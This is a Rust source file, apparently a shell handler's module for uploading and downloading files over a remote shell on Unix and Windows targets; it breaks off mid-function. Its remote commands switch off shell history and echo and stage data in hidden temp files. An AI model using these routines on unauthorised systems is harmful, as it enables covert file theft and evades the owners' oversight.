use std::io::{self, Write as _};
use std::time::Duration;

use tokio::io::{AsyncRead, AsyncReadExt, AsyncWrite, AsyncWriteExt};
use tokio::time::timeout;

use crate::cli::ShellType;
use crate::util::{base64_decode, base64_encode, find_slice};

const IDLE_TIMEOUT: Duration = Duration::from_secs(30);
/// Flush progress every N decoded bytes.
const PROGRESS_EVERY: u64 = 512 * 1024;

// ---------------------------------------------------------------------------
// Download
// ---------------------------------------------------------------------------

/// Drain pending bytes from `reader` for at most `for_duration` total.
///
/// Uses a single deadline so a chatty remote (PS1 prompts, banners) cannot
/// extend the drain indefinitely by continuously sending data within the window.
async fn drain_reader<R: AsyncRead + Unpin>(reader: &mut R, for_duration: Duration) {
    let deadline = tokio::time::Instant::now() + for_duration;
    let mut buf = vec![0u8; 4096];
    loop {
        let remaining = deadline.saturating_duration_since(tokio::time::Instant::now());
        if remaining.is_zero() {
            break;
        }
        match timeout(remaining, reader.read(&mut buf)).await {
            Ok(Ok(n)) if n > 0 => {}
            _ => break,
        }
    }
}

/// Download a remote file to the local filesystem.
///
/// Protocol:
///  1. Disable echo + history on the remote (one echoed line, unavoidable).
///  2. Drain PTY feedback from that command.
///  3. Send the main download command with per-download nonce delimiters so
///     PTY echo of the command itself can never false-trigger the state machine.
///  4. Stream base64, decode via carry-buffer state machine (handles TCP
///     chunk boundaries for delimiters).
///  5. SHA256 verify; restore echo + history on the remote.
///  6. On any error, delete the partially-written local file.
pub async fn download<R, W>(
    reader: &mut R,
    writer: &mut W,
    remote_path: &str,
    local_path: &str,
    stdout: &mut io::Stdout,
    shell_type: ShellType,
) -> anyhow::Result<()>
where
    R: AsyncRead + Unpin,
    W: AsyncWrite + Unpin,
{
    if shell_type == ShellType::Windows {
        return download_windows(reader, writer, remote_path, local_path, stdout).await;
    }

    let qpath = shell_quote(remote_path);
    let nonce = gen_nonce();

    // Per-download nonce delimiters.  Using printf 'SH%s%s\n' 'STRT' 'nonce' means
    // the literal "SHSTRT<nonce>" string never appears in the command text, so PTY
    // echo of the command cannot false-trigger the state machine.
    let ds: Vec<u8> = format!("SHSTRT{nonce}").into_bytes();
    let de: Vec<u8> = format!("SHEEND{nonce}").into_bytes();
    let dnf: Vec<u8> = format!("SHNF{nonce}").into_bytes();

    write!(stdout, "  \x1b[2m[↓]\x1b[0m  {} \u{2192} {}   0 B\r", remote_path, local_path)?;
    stdout.flush()?;

    // Save history state and disable echo.  This one line IS echoed by the PTY
    // (unavoidable — echo fires before the command executes).
    // set +o history disables recording without clearing in-memory history.
    writer
        .write_all(
            b" _OHFP=\"$HISTFILE\"; set +o history; HISTFILE=/dev/null; stty -echo 2>/dev/null\n",
        )
        .await?;
    writer.flush().await?;
    tokio::time::sleep(Duration::from_millis(80)).await;

    // Drain PTY echo/feedback from the stty command before sending the real
    // download command so stale bytes don't confuse the state machine.
    drain_reader(reader, Duration::from_millis(30)).await;

    // Best-effort file-size probe — shows "recv / total  N%" in the progress bar.
    // stat -c%s (GNU/Linux) or stat -f%z (BSD/macOS); neither reads the file content.
    let sz_nonce = gen_nonce();
    let size_probe = format!(
        " stat -c%s {qpath} 2>/dev/null || stat -f%z {qpath} 2>/dev/null; echo 'SHSZ_{sz_nonce}'\n"
    );
    writer.write_all(size_probe.as_bytes()).await?;
    writer.flush().await?;
    let sz_resp = read_until_marker(reader, &format!("SHSZ_{sz_nonce}")).await?;
    let file_size: Option<u64> = sz_resp
        .lines()
        .filter_map(|l| l.trim().parse::<u64>().ok())
        .next();

    // Main download command — arrives silently (echo is now off).
    // Encoder fallback chain (most to least portable):
    //   1. python3 — always available on macOS; no line-wrap issues
    //   2. base64 -w0 — GNU coreutils (Linux)
    //   3. base64 — BSD/macOS (wraps at 76 chars, decoder strips whitespace)
    //   4. openssl base64 — last resort, wraps at 64 chars
    // if/else/fi avoids `exit 1` which would kill the remote bash session.
    let cmd = format!(
        "if test -r {qpath} 2>/dev/null; then \
         printf 'SH%s%s\\n' 'STRT' '{nonce}'; \
         python3 -c 'import base64,sys;sys.stdout.buffer.write(base64.b64encode(open(sys.argv[1],\"rb\").read()))' {qpath} 2>/dev/null \
         || base64 -w0 {qpath} 2>/dev/null \
         || base64 {qpath} 2>/dev/null \
         || openssl base64 -in {qpath} 2>/dev/null; \
         printf '\\nSH%s%s\\n' 'EEND' '{nonce}'; \
         else printf 'SH%s%s\\n' 'NF' '{nonce}'; fi\n"
    );
    writer.write_all(cmd.as_bytes()).await?;
    writer.flush().await?;

    // Create the destination file early to surface path errors before waiting
    // on the network.
    let mut local_file = tokio::fs::File::create(local_path)
        .await
        .map_err(|e| anyhow::anyhow!("cannot create {local_path}: {e}"))?;

    let result = recv_b64_to_file(
        reader, &mut local_file,
        &ds, &de, &dnf,
        file_size, remote_path, local_path, stdout,
    ).await;

    drop(local_file);

    let bytes_written = match result {
        Ok(n) => n,
        Err(e) => {
            let _ = tokio::fs::remove_file(local_path).await;
            return Err(e);
        }
    };

    write!(stdout, "\x1b[2K")?; // erase progress line
    stdout.flush()?;

    // SHA256 verification.  Echo is still OFF (restored at end of sha_cmd),
    // so `echo 'SHSHA_...:done'` cannot be echoed back and false-match.
    let sha_nonce = gen_nonce();
    // Use full paths for sha256sum/shasum so they work even with a stripped PATH.
    let sha_cmd = format!(
        "sha256sum {qpath} 2>/dev/null \
         || shasum -a 256 {qpath} 2>/dev/null \
         || /usr/bin/shasum -a 256 {qpath} 2>/dev/null \
         || python3 -c 'import hashlib,sys;print(hashlib.sha256(open(sys.argv[1],\"rb\").read()).hexdigest())' {qpath} 2>/dev/null; \
         echo 'SHSHA_{sha_nonce}:done'; \
         set -o history; HISTFILE=\"$_OHFP\"; unset _OHFP; stty echo 2>/dev/null\n"
    );
    writer.write_all(sha_cmd.as_bytes()).await?;
    writer.flush().await?;

    let sha_resp = read_until_marker(reader, &format!("SHSHA_{sha_nonce}:done")).await?;
    let remote_hash = parse_sha256_from_output(&sha_resp);
    let local_hash = sha256_local(local_path).await.ok();

    // If we received 0 bytes and cannot confirm the remote file is empty via
    // sha256 (e.g. sha256sum not in PATH on target), surface a clear diagnostic
    // so the operator knows the encoding step likely failed.
    if bytes_written == 0 {
        match (&local_hash, &remote_hash) {
            (Some(lh), Some(rh)) if lh == rh => {
                // Both hashes are the sha256 of an empty file — the remote file
                // genuinely is empty. Fall through to normal reporting.
            }
            (_, None) => {
                // Cannot verify — warn loudly instead of silently claiming success.
                write!(
                    stdout,
                    "  \x1b[1;33m[!]\x1b[0m  \x1b[2m[↓]\x1b[0m  0 B received — \
                     base64 encoder may be missing from PATH on target \
                     \x1b[2m(try: which python3 base64 openssl)\x1b[0m\r\n"
                )?;
                stdout.flush()?;
                let _ = tokio::fs::remove_file(local_path).await;
                return Err(anyhow::anyhow!(
                    "download produced 0 bytes; remote base64 encoder not found in PATH"
                ));
            }
            _ => {}
        }
    }

    print_transfer_result(
        stdout,
        "↓",
        remote_path,
        local_path,
        bytes_written,
        local_hash.as_deref(),
        remote_hash.as_deref(),
    )?;
    Ok(())
}

// ---------------------------------------------------------------------------
// Upload
// ---------------------------------------------------------------------------

/// Upload a local file to the remote system using a heredoc-streamed base64 payload.
///
/// Sends data in 76-char base64 lines inside a shell heredoc — no ARG_MAX limit.
/// Reads and drains the remote's echo concurrently to prevent TCP deadlock.
pub async fn upload<R, W>(
    reader: &mut R,
    writer: &mut W,
    local_path: &str,
    remote_path: &str,
    stdout: &mut io::Stdout,
    shell_type: ShellType,
) -> anyhow::Result<()>
where
    R: AsyncRead + Unpin,
    W: AsyncWrite + Unpin,
{
    if shell_type == ShellType::Windows {
        return upload_windows(reader, writer, local_path, remote_path, stdout).await;
    }

    // Validate local file before touching the remote.
    let metadata = tokio::fs::metadata(local_path).await
        .map_err(|_| anyhow::anyhow!("local file not found: {local_path}"))?;
    let file_size = metadata.len();
    let nonce = gen_nonce();
    let qpath = shell_quote(remote_path);
    let tmp = format!("/tmp/.shh_{}", gen_temp_nonce());

    // Initial status line — overwritten in-place by progress updates.
    if file_size > 0 {
        write!(stdout, "  \x1b[2m[↑]\x1b[0m  {} \u{2192} {}   0 B  \x1b[2m0%\x1b[0m\r", local_path, remote_path)?;
    } else {
        write!(stdout, "  \x1b[2m[↑]\x1b[0m  {} \u{2192} {}   0 B\r", local_path, remote_path)?;
    }
    stdout.flush()?;

    // Step 1: save history state, disable recording, turn off echo. This line IS
    // echoed by the PTY (unavoidable). set +o history disables recording without
    // clearing in-memory history (unlike HISTSIZE=0 which wipes everything).
    writer.write_all(b" _OHFP=\"$HISTFILE\"; set +o history; HISTFILE=/dev/null; stty -echo 2>/dev/null\n").await?;
    writer.flush().await?;
    tokio::time::sleep(Duration::from_millis(60)).await;

    // Step 2: open heredoc — arrives silently. Flush separately so bash enters
    // heredoc mode before any base64 data arrives (prevents empty-file bug).
    let open_cmd = format!("cat > '{tmp}' << '__SHUPEOF__'\n");
    writer.write_all(open_cmd.as_bytes()).await?;
    writer.flush().await?;
    tokio::time::sleep(Duration::from_millis(30)).await;

    // Read local file in 57-byte chunks → exactly 76 base64 chars per line.
    // Concurrently drain reader to prevent TCP buffer deadlock on large files.
    let mut raw_chunk = vec![0u8; 57];
    let mut net_buf = vec![0u8; 65536];
    let mut response_acc = String::new();
    let mut bytes_sent: u64 = 0;
    let mut last_progress_at: u64 = 0;
    let mut flush_counter: u32 = 0;
    let mut file = tokio::fs::File::open(local_path).await
        .map_err(|e| anyhow::anyhow!("cannot open {local_path}: {e}"))?;

    loop {
        tokio::select! {
            biased; // write side has priority; read side drains when write blocks

            read_n = file.read(&mut raw_chunk) => {
                let n = read_n.map_err(|e| anyhow::anyhow!("read local file: {e}"))?;
                if n == 0 {
                    // File exhausted — we break out and close the heredoc below.
                    break;
                }
                let line = base64_encode(&raw_chunk[..n]);
                writer.write_all(line.as_bytes()).await?;
                writer.write_all(b"\n").await?;
                bytes_sent += n as u64;

                flush_counter += 1;
                if flush_counter >= 64 {
                    writer.flush().await?;
                    flush_counter = 0;
                }

                if bytes_sent.saturating_sub(last_progress_at) >= PROGRESS_EVERY {
                    last_progress_at = bytes_sent;
                    if file_size > 0 {
                        let pct = bytes_sent * 100 / file_size;
                        write!(
                            stdout,
                            "  \x1b[2m[↑]\x1b[0m  {} \u{2192} {}   {}  \x1b[2m{}%\x1b[0m\r",
                            local_path, remote_path, fmt_bytes(bytes_sent), pct
                        )?;
                    } else {
                        write!(stdout, "  \x1b[2m[↑]\x1b[0m  {} \u{2192} {}   {}\r", local_path, remote_path, fmt_bytes(bytes_sent))?;
                    }
                    stdout.flush()?;
                }
            }

            // Drain the remote's echo / PS2 prompts so the TCP send buffer
            // never fills up and blocks the write arm above.
            drain_n = reader.read(&mut net_buf) => {
                match drain_n {
                    Ok(0) => anyhow::bail!("connection closed during upload"),
                    Ok(n) => {
                        response_acc.push_str(&String::from_utf8_lossy(&net_buf[..n]));
                        // Prevent unbounded growth from verbose remotes.
                        // Keep only the tail — only the last portion matters for marker detection.
                        const DRAIN_CAP: usize = 4 * 1024 * 1024;
                        if response_acc.len() > DRAIN_CAP {
                            let keep_from = response_acc.len() - 65536;
                            response_acc.drain(..keep_from);
                        }
                    }
                    Err(e) => anyhow::bail!("read error during upload drain: {e}"),
                }
            }
        }
    }

    // Close the heredoc and trigger decode. Decoder chain (most to least portable):
    //   1. python3 — always available on macOS; handles wrapped base64 natively
    //   2. base64 -d — GNU coreutils (Linux)
    //   3. base64 -D — BSD base64 flag (older macOS)
    // History and echo are restored at the end so they are always repaired even
    // if the decode fails and our Rust code bails after reading the exit marker.
    let up_marker = format!("SHUP_{nonce}:");
    let close_cmd = format!(
        "__SHUPEOF__\n \
         python3 -c \"import base64,sys;sys.stdout.buffer.write(base64.b64decode(sys.stdin.read()))\" < '{tmp}' > {qpath} 2>/dev/null \
         || base64 -d '{tmp}' > {qpath} 2>/dev/null \
         || base64 -D '{tmp}' > {qpath} 2>/dev/null; \
         echo 'SHUP_{nonce}:'$?; rm -f '{tmp}'; \
         set -o history; HISTFILE=\"$_OHFP\"; unset _OHFP; stty echo 2>/dev/null\n"
    );
    writer.write_all(close_cmd.as_bytes()).await?;
    writer.flush().await?;

    // Collect remaining output until we see the SHUP marker.
    let full_response = read_until_marker_with_prefix(reader, &up_marker, response_acc).await?;

    let exit_code: i32 = full_response
        .lines()
        .find(|l| l.contains(&up_marker))
        .and_then(|l| l.splitn(2, ':').nth(1))
        .and_then(|s| s.trim().parse().ok())
        .unwrap_or(1);

    write!(stdout, "\x1b[2K")?;
    stdout.flush()?;

    if exit_code != 0 {
        anyhow::bail!(
            "remote decode failed (exit {exit_code}) — tried python3 / base64 -d / base64 -D; \
             check that python3 or GNU base64 is in PATH on the target"
        );
    }

    // SHA256 verification. Echo is ON at this point (restored in close_cmd), so the
    // PTY would echo back the sha_cmd text verbatim. Using printf with %s means the
    // marker literal never appears in the echoed text — only in the program's output.
    let sha_nonce = gen_nonce();
    let sha_cmd = format!(
        "sha256sum {qpath} 2>/dev/null \
         || shasum -a 256 {qpath} 2>/dev/null \
         || /usr/bin/shasum -a 256 {qpath} 2>/dev/null \
         || python3 -c 'import hashlib,sys;print(hashlib.sha256(open(sys.argv[1],\"rb\").read()).hexdigest())' {qpath} 2>/dev/null; \
         printf 'SHSHA_%s:done\\n' '{sha_nonce}'\n"
    );
    writer.write_all(sha_cmd.as_bytes()).await?;
    writer.flush().await?;

    let sha_resp = read_until_marker(reader, &format!("SHSHA_{sha_nonce}:done")).await?;
    let remote_hash = parse_sha256_from_output(&sha_resp);
    let local_hash = sha256_local(local_path).await.ok();

    print_transfer_result(stdout, "↑", local_path, remote_path, bytes_sent, local_hash.as_deref(), remote_hash.as_deref())?;
    Ok(())
}

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

// ---------------------------------------------------------------------------
// Download — Windows (PowerShell)
// ---------------------------------------------------------------------------

/// Download a remote file from a Windows/PowerShell target.
///
/// Uses `[IO.File]::ReadAllBytes` + `[Convert]::ToBase64String` — no external
/// tools required, works on all PowerShell versions.  Works whether the current
/// shell is cmd.exe (via `powershell -NoP -c`) or PowerShell directly.
async fn download_windows<R, W>(
    reader: &mut R,
    writer: &mut W,
    remote_path: &str,
    local_path: &str,
    stdout: &mut io::Stdout,
) -> anyhow::Result<()>
where
    R: AsyncRead + Unpin,
    W: AsyncWrite + Unpin,
{
    let nonce = gen_nonce();
    let ds: Vec<u8> = format!("SHSTRT{nonce}").into_bytes();
    let de: Vec<u8> = format!("SHEEND{nonce}").into_bytes();
    let dnf: Vec<u8> = format!("SHNF{nonce}").into_bytes();
    let qpath = ps_quote(remote_path);

    write!(stdout, "  \x1b[2m[↓]\x1b[0m  {} \u{2192} {}   0 B\r", remote_path, local_path)?;
    stdout.flush()?;

    // Best-effort size probe via PowerShell.
    let sz_nonce = gen_nonce();
    let size_probe = format!(
        "try{{Write-Output (Get-Item {qpath}).Length}}catch{{Write-Output 0}};Write-Output 'SHSZ_{sz_nonce}'\n"
    );
    writer.write_all(size_probe.as_bytes()).await?;
    writer.flush().await?;
    let sz_resp = read_until_marker(reader, &format!("SHSZ_{sz_nonce}")).await?;
    let file_size: Option<u64> = sz_resp
        .lines()
        .filter_map(|l| l.trim().parse::<u64>().ok())
        .next();

    // Main download command — single PS statement, outputs delimited base64.
    let cmd = format!(
        "try{{$_b=[IO.File]::ReadAllBytes({qpath});\
         Write-Output 'SHSTRT{nonce}';\
         Write-Output ([Convert]::ToBase64String($_b));\
         Write-Output 'SHEEND{nonce}'}}catch{{Write-Output 'SHNF{nonce}'}}\n"
    );
    writer.write_all(cmd.as_bytes()).await?;
    writer.flush().await?;

    let mut local_file = tokio::fs::File::create(local_path)
        .await
        .map_err(|e| anyhow::anyhow!("cannot create {local_path}: {e}"))?;

    let result = recv_b64_to_file(
        reader, &mut local_file,
        &ds, &de, &dnf,
        file_size, remote_path, local_path, stdout,
    ).await;

    drop(local_file);

    let bytes_written = match result {
        Ok(n) => n,
        Err(e) => {
            let _ = tokio::fs::remove_file(local_path).await;
            return Err(e);
        }
    };

    write!(stdout, "\x1b[2K")?;
    stdout.flush()?;

    // SHA256 via Get-FileHash (PS3+) with .NET fallback for PS2.
    let sha_nonce = gen_nonce();
    let sha_cmd = format!(
        "try{{(Get-FileHash {qpath} -Algorithm SHA256).Hash.ToLower()}}catch{{\
         $s=[Security.Cryptography.SHA256]::Create();\
         ($s.ComputeHash([IO.File]::ReadAllBytes({qpath}))|%{{\"{{0:x2}}\"-f $_}})-join\"\";\
         $s.Dispose()}};\
         Write-Output 'SHSHA_{sha_nonce}:done'\n"
    );
    writer.write_all(sha_cmd.as_bytes()).await?;
    writer.flush().await?;

    let sha_resp = read_until_marker(reader, &format!("SHSHA_{sha_nonce}:done")).await?;
    let remote_hash = parse_sha256_from_output(&sha_resp);
    let local_hash = sha256_local(local_path).await.ok();

    if bytes_written == 0 {
        if let (_, None) = (&local_hash, &remote_hash) {
            write!(
                stdout,
                "  \x1b[1;33m[!]\x1b[0m  \x1b[2m[↓]\x1b[0m  0 B received — \
                 Get-FileHash or [IO.File]::ReadAllBytes unavailable on target\r\n"
            )?;
            stdout.flush()?;
            let _ = tokio::fs::remove_file(local_path).await;
            return Err(anyhow::anyhow!("download produced 0 bytes on Windows target"));
        }
    }

    print_transfer_result(stdout, "↓", remote_path, local_path, bytes_written, local_hash.as_deref(), remote_hash.as_deref())?;
    Ok(())
}

// ---------------------------------------------------------------------------
// Upload — Windows (PowerShell)
// ---------------------------------------------------------------------------

/// Upload a local file to a Windows/PowerShell target.
///
/// Streams base64 data using `Add-Content` per chunk (no heredoc equivalent
/// on Windows).  Chunk size is larger than Linux to reduce round-trips.
/// Works whether the current shell is cmd.exe or PowerShell; the commands
/// use only .NET APIs available on all PowerShell versions.
async fn upload_windows<R, W>(
    reader: &mut R,
    writer: &mut W,
    local_path: &str,
    remote_path: &str,
    stdout: &mut io::Stdout,
) -> anyhow::Result<()>
where
    R: AsyncRead + Unpin,
    W: AsyncWrite + Unpin,
{
    let metadata = tokio::fs::metadata(local_path).await
        .map_err(|_| anyhow::anyhow!("local file not found: {local_path}"))?;
    let file_size = metadata.len();
    let nonce = gen_nonce();
    let tmp_nonce = gen_temp_nonce();
    let qpath = ps_quote(remote_path);
    // The temp file is referenced via a PS variable expansion string (not ps_quote'd,
    // since $env:TEMP itself is a PS variable we want PS to expand at runtime).
    let tmp_ps = format!("$env:TEMP\\shh_{tmp_nonce}.b64");

    if file_size > 0 {
        write!(stdout, "  \x1b[2m[↑]\x1b[0m  {} \u{2192} {}   0 B  \x1b[2m0%\x1b[0m\r", local_path, remote_path)?;
    } else {
        write!(stdout, "  \x1b[2m[↑]\x1b[0m  {} \u{2192} {}   0 B\r", local_path, remote_path)?;
    }
    stdout.flush()?;

    // Create / clear the temp file on the remote.
    writer.write_all(
        format!("$null > \"{tmp_ps}\"\n").as_bytes()
    ).await?;
    writer.flush().await?;
    // Give PS a moment to process the init command and drain any echo/prompt.
    tokio::time::sleep(Duration::from_millis(60)).await;
    drain_reader(reader, Duration::from_millis(30)).await;

    // Stream base64 chunks via Add-Content.  3 KB raw → 4 KB base64 per command
    // balances command length vs round-trip count.
    const WIN_CHUNK: usize = 3 * 1024;
    let mut raw_chunk = vec![0u8; WIN_CHUNK];
    let mut net_buf = vec![0u8; 65536];
    let mut bytes_sent: u64 = 0;
    let mut last_progress_at: u64 = 0;
    let mut flush_ctr: u32 = 0;
    let mut file = tokio::fs::File::open(local_path).await
        .map_err(|e| anyhow::anyhow!("cannot open {local_path}: {e}"))?;

    loop {
        tokio::select! {
            biased;
            read_n = file.read(&mut raw_chunk) => {
                let n = read_n.map_err(|e| anyhow::anyhow!("read local file: {e}"))?;
                if n == 0 { break; }
                let b64 = base64_encode(&raw_chunk[..n]);
                let cmd = format!("Add-Content \"{tmp_ps}\" \"{b64}\"\n");
                writer.write_all(cmd.as_bytes()).await?;
                bytes_sent += n as u64;

                flush_ctr += 1;
                if flush_ctr >= 8 {
                    writer.flush().await?;
                    flush_ctr = 0;
                }

                if bytes_sent.saturating_sub(last_progress_at) >= PROGRESS_EVERY {
                    last_progress_at = bytes_sent;
                    if file_size > 0 {
                        let pct = bytes_sent * 100 / file_size;
                        write!(
                            stdout,
                            "  \x1b[2m[↑]\x1b[0m  {} \u{2192} {}   {}  \x1b[2m{}%\x1b[0m\r",
                            local_path, remote_path, fmt_bytes(bytes_sent), pct
                        )?;
                    } else {
                        write!(stdout, "  \x1b[2m[↑]\x1b[0m  {} \u{2192} {}   {}\r", local_path, remote_path, fmt_bytes(bytes_sent))?;
                    }
                    stdout.flush()?;
                }
            }
            drain_n = reader.read(&mut net_buf) => {
                match drain_n {
                    Ok(0) => anyhow::bail!("connection closed during upload"),
                    Ok(_) => {}
                    Err(e) => anyhow::bail!("read error during upload drain: {e}"),
                }
            }
        }
    }

    writer.flush().await?;
    // Drain any remaining PS prompts before sending the finalize command.
    drain_reader(reader, Duration::from_millis(150)).await;

    // Decode temp file to destination, emit exit marker, clean up.
    let up_marker = format!("SHUP_{nonce}:");
    let finalize = format!(
        "try{{\
         $_b=[IO.File]::ReadAllText(\"{tmp_ps}\") -replace '\\s','';\
         [IO.File]::WriteAllBytes({qpath},[Convert]::FromBase64String($_b));\
         Write-Output 'SHUP_{nonce}:0'\
         }}catch{{\
         Write-Output 'SHUP_{nonce}:1'\
         }};Remove-Item -Force \"{tmp_ps}\" -EA 0\n"
    );
    writer.write_all(finalize.as_bytes()).await?;
    writer.flush().await?;

    let full_response = read_until_marker(reader, &up_marker).await?;
    let exit_code: i32 = full_response
        .lines()
        .find(|l| l.contains(&up_marker))
        .and_then(|l| l.splitn(2, ':').nth(1))
        .and_then(|s| s.trim().parse().ok())
        .unwrap_or(1);

    write!(stdout, "\x1b[2K")?;
    stdout.flush()?;

    if exit_code != 0 {
        anyhow::bail!(
            "remote decode failed (exit {exit_code}) — check that [Convert]::FromBase64String \
             and [IO.File]::WriteAllBytes are available on the target"
        );
    }

    // SHA256 verification.
    let sha_nonce = gen_nonce();
    let sha_cmd = format!(
        "try{{(Get-FileHash {qpath} -Algorithm SHA256).Hash.ToLower()}}catch{{\
         $s=[Security.Cryptography.SHA256]::Create();\
         ($s.ComputeHash([IO.File]::ReadAllBytes({qpath}))|%{{\"{{0:x2}}\"-f $_}})-join\"\";\
         $s.Dispose()}};\
         Write-Output 'SHSHA_{sha_nonce}:done'\n"
    );
    writer.write_all(sha_cmd.as_bytes()).await?;
    writer.flush().await?;

    let sha_resp = read_until_marker(reader, &format!("SHSHA_{sha_nonce}:done")).await?;
    let remote_hash = parse_sha256_from_output(&sha_resp);
    let local_hash = sha256_local(local_path).await.ok();

    print_transfer_result(stdout, "↑", local_path, remote_path, bytes_sent, local_hash.as_deref(), remote_hash.as_deref())?;
    Ok(())
}

// ---------------------------------------------------------------------------
// Shared state machine for incoming base64 data
// ---------------------------------------------------------------------------

/// Receive a delimited base64 stream from `reader` and write decoded bytes to
/// `local_file`.  Shared by both the Linux and Windows download paths.
///
/// Returns the number of decoded bytes written.
async fn recv_b64_to_file<R: AsyncRead + Unpin>(
    reader: &mut R,
    local_file: &mut tokio::fs::File,
    ds: &[u8],
    de: &[u8],
    dnf: &[u8],
    file_size: Option<u64>,
    remote_path: &str,
    local_path: &str,
    stdout: &mut io::Stdout,
) -> anyhow::Result<u64> {
    let max_delim_len = ds.len().max(de.len()).max(dnf.len());
    let mut carry: Vec<u8> = Vec::new();
    let mut carry_pos: usize = 0;
    const COMPACT_AT: usize = 1 << 20;

    let mut b64_acc: Vec<u8> = Vec::with_capacity(4096);
    let mut bytes_written: u64 = 0;
    let mut last_progress_at: u64 = 0;
    let mut state: u8 = 0;
    let mut raw_buf = vec![0u8; 65536];

    loop {
        let n = timeout(IDLE_TIMEOUT, reader.read(&mut raw_buf))
            .await
            .map_err(|_| anyhow::anyhow!("download timed out (no data for 30 s)"))?
            .map_err(|e| anyhow::anyhow!("read error: {e}"))?;

        if n == 0 {
            anyhow::bail!("connection closed during download");
        }

        carry.extend_from_slice(&raw_buf[..n]);

        if carry_pos > COMPACT_AT {
            carry.drain(..carry_pos);
            carry_pos = 0;
        }

        'process: loop {
            let buf = &carry[carry_pos..];

            match state {
                0 => {
                    let nf_pos = find_slice(buf, dnf);
                    let st_pos = find_slice(buf, ds);

                    let notfound = match (nf_pos, st_pos) {
                        (Some(_), None) => true,
                        (Some(nf), Some(st)) if nf < st => true,
                        _ => false,
                    };
                    if notfound {
                        anyhow::bail!("remote file not found: {remote_path}");
                    }

                    match st_pos {
                        Some(pos) => {
                            carry_pos += pos + ds.len();
                            state = 1;
                        }
                        None => {
                            if buf.len() >= max_delim_len {
                                carry_pos = carry.len() - (max_delim_len - 1);
                            }
                            break 'process;
                        }
                    }
                }
                1 => {
                    let buf = &carry[carry_pos..];
                    match find_slice(buf, de) {
                        Some(pos) => {
                            for &b in &buf[..pos] {
                                if !b.is_ascii_whitespace() {
                                    b64_acc.push(b);
                                }
                            }
                            bytes_written += flush_b64(&mut b64_acc, local_file, true).await?;
                            state = 2;
                            break 'process;
                        }
                        None => {
                            let safe = buf.len().saturating_sub(de.len() - 1);
                            for &b in &buf[..safe] {
                                if !b.is_ascii_whitespace() {
                                    b64_acc.push(b);
                                }
                            }
                            bytes_written += flush_b64(&mut b64_acc, local_file, false).await?;
                            carry_pos += safe;

                            if bytes_written.saturating_sub(last_progress_at) >= PROGRESS_EVERY {
                                last_progress_at = bytes_written;
                                if let Some(fs) = file_size {
                                    let pct = if fs > 0 { bytes_written * 100 / fs } else { 100 };
                                    write!(
                                        stdout,
                                        "  \x1b[2m[↓]\x1b[0m  {} \u{2192} {}   {} / {}  \x1b[2m{}%\x1b[0m\r",
                                        remote_path, local_path,
                                        fmt_bytes(bytes_written), fmt_bytes(fs), pct
                                    )?;
                                } else {
                                    write!(
                                        stdout,
                                        "  \x1b[2m[↓]\x1b[0m  {} \u{2192} {}   {}\r",
                                        remote_path, local_path, fmt_bytes(bytes_written)
                                    )?;
                                }
                                stdout.flush()?;
                            }
                            break 'process;
                        }
                    }
                }
                _ => break 'process,
            }
        }

        if state >= 2 {
            break;
        }
    }

    local_file.flush().await?;
    Ok(bytes_written)
}

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

/// Double-quote a path for PowerShell, escaping backticks, double-quotes, and
/// dollar signs (prevents variable expansion inside the quoted string).
fn ps_quote(path: &str) -> String {
    format!(
        "\"{}\"",
        path.replace('`', "``").replace('"', "`\"").replace('$', "`$")
    )
}

/// Single-quote escaping for POSIX shell paths.
fn shell_quote(path: &str) -> String {
    format!("'{}'", path.replace('\'', "'\\''"))
}

/// 8-char lowercase hex nonce (used for protocol markers).
fn gen_nonce() -> String {
    use rand::Rng;
    format!("{:08x}", rand::thread_rng().r#gen::<u32>())
}

/// 16-char lowercase hex nonce (used for remote temp file names to resist races).
fn gen_temp_nonce() -> String {
    use rand::Rng;
    format!("{:016x}", rand::thread_rng().r#gen::<u64>())
}

fn fmt_bytes(b: u64) -> String {
    if b < 1024 {
        format!("{b} B")
    } else if b < 1_048_576 {
        format!("{:.1} KB", b as f64 / 1024.0)
    } else {
        format!("{:.1} MB", b as f64 / 1_048_576.0)
    }
}

/// Compute SHA-256 of a local file in pure Rust via `spawn_blocking`.
///
/// Never blocks the async executor — the file I/O and hashing run on the
/// blocking thread pool, so large files don't stall the session loop.
async fn sha256_local(path: &str) -> anyhow::Result<String> {
    use sha2::{Digest, Sha256};
    let path = path.to_string();
    tokio::task::spawn_blocking(move || {
        let mut file = std::fs::File::open(&path)
            .map_err(|e| anyhow::anyhow!("cannot open {path} for sha256: {e}"))?;
        let mut hasher = Sha256::new();
        let mut buf = vec![0u8; 65536];
        loop {
            use std::io::Read;
            let n = file
                .read(&mut buf)
                .map_err(|e| anyhow::anyhow!("read error computing sha256: {e}"))?;
            if n == 0 {
                break;
            }
            hasher.update(&buf[..n]);
        }
        Ok(format!("{:x}", hasher.finalize()))
    })
    .await
    .map_err(|e| anyhow::anyhow!("sha256 task panicked: {e}"))?
}

/// Parse the 64-char hex hash from `sha256sum` / `shasum` output.
///
/// Requires the FIRST whitespace-delimited token to be EXACTLY 64 hex chars —
/// a sha256 hash can never be more or fewer. This prevents matching bash prompt
/// echo lines (e.g. `bash-3.2$`) that start with a hex digit but aren't hashes.
fn parse_sha256_from_output(text: &str) -> Option<String> {
    text.lines()
        .filter_map(|l| l.split_whitespace().next())
        .find(|tok| tok.len() == 64 && tok.chars().all(|c| c.is_ascii_hexdigit()))
        .map(|s| s.to_string())
}

/// Drain accumulated base64 chars to the file.
///
/// When `final_flush = false`: only complete groups of 4 are decoded (safe
/// for mid-stream use, no partial group / padding issues).
/// When `final_flush = true`: decode everything including the terminal group.
///
/// Returns the number of decoded bytes written.
async fn flush_b64(
    acc: &mut Vec<u8>,
    file: &mut tokio::fs::File,
    final_flush: bool,
) -> anyhow::Result<u64> {
    if acc.is_empty() {
        return Ok(0);
    }

    let decodable = if final_flush {
        acc.len()
    } else {
        (acc.len() / 4) * 4
    };

    if decodable == 0 {
        return Ok(0);
    }

    let s = std::str::from_utf8(&acc[..decodable])
        .map_err(|e| anyhow::anyhow!("non-UTF8 in base64 stream: {e}"))?;
    let decoded = base64_decode(s)
        .ok_or_else(|| anyhow::anyhow!("invalid base64 content from remote"))?;

    let written = decoded.len() as u64;
    file.write_all(&decoded).await?;

    let remainder = acc[decodable..].to_vec();
    *acc = remainder;

    Ok(written)
}

/// Read from `reader` until `marker` appears in the accumulated text.
async fn read_until_marker<R: AsyncRead + Unpin>(
    reader: &mut R,
    marker: &str,
) -> anyhow::Result<String> {
